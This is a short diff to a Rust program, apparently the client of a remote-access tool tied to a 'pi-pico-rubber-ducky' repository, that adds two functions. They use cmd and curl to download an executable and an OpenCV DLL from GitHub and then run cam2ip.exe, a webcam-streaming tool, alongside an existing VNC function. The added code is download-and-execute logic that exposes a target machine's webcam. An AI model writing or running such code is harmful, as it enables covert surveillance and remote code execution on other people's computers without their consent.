@@ -111,6 +111,36 @@ fn vnc() {
     }
 }
 
+
+
+fn cam2ip() {
+    let output = Command::new("cmd")
+        .args(&["/C", "curl.exe", "--output", "cam2ip.exe", "--url", "https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/cam2ip/cam2ip.exe"])
+        .output()
+        .expect("failed to execute process");
+
+    let output = Command::new("cmd")
+        .args(&["/C", "cam2ip.exe"])
+        .output()
+        .expect("failed to execute process");
+
+    for out in String::from_utf8(output.stdout).iter() {
+        println!("{}", out);
+    }
+}
+
+fn cam2ipdll() {
+    let output = Command::new("cmd")
+        .args(&["/C", "curl.exe", "--output", "opencv_ffmpeg2413_64.dll", "--url", "https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/cam2ip/opencv_ffmpeg2413_64.dll"])
+        .output()
+        .expect("failed to execute process");
+
+    for out in String::from_utf8(output.stdout).iter() {
+        println!("{}", out);
+    }
+}
+
+
 #[tokio::main]
 async fn main() -> io::Result<()> {
     // Generate priv and pub key of client
